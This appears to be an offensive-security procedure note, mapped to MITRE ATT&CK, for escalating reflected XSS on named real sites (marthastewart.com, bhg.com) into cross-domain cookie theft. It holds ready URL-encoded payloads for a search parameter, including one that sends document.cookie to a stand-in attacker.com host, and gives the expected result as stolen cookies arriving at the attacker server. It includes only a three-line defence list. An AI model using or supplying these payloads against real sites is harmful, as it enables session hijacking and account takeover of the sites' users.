---
tags:
  - xss
  - cross-domain
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:28:12.232Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 5801e2ec-ef81-4b22-95e3-9bb033c642e3
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Test-Cross-Domain-XSS-Payloads

## Summary

This procedure extends XSS testing by modifying payloads to leverage document.domain for cross-domain effects, enhancing the potential for cookie theft across sites.

## Description

Once basic XSS is confirmed, attackers can tweak payloads to interact with document.domain, allowing access to properties or cookies that might span domains like marthastewart.com and bhg.com, both under Meredith Corporation.

## Requirements

1. Confirmed basic XSS
2. Understanding of same-origin policy exceptions
3. Browser console for testing

## Defense

Defensive measures and detection strategies:

- Enforce strict same-origin policy
- Use HttpOnly flags on cookies
- Audit cross-domain JS interactions

## Objectives

1. Explore domain-level access via payloads
2. Confirm exfiltration potential
3. Identify limitations in cross-domain execution

## Instructions

### Step 1: Modify Payload for Document Domain

**Context**: Inject a payload that accesses and logs document.domain.

Append to URL:

```url
?s=%E2%80%98);%3C/script%3E%3Cscript%3Econsole.log(document.domain);alert(document.domain)%3C/script%3E
```

> Load and check console/alert for domain info.

### Step 2: Test Cookie Access Across Domains

**Context**: Extend to steal and exfil cookies using domain properties.

Use payload like: ?s=%E2%80%98);%3C/script%3E%3Cscript%3Efetch('https://attacker.com/steal?cookie='+document.cookie)%3C/script%3E

> Expected output: Request sent to attacker server with cookies; verify in network tab.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- cross-domain
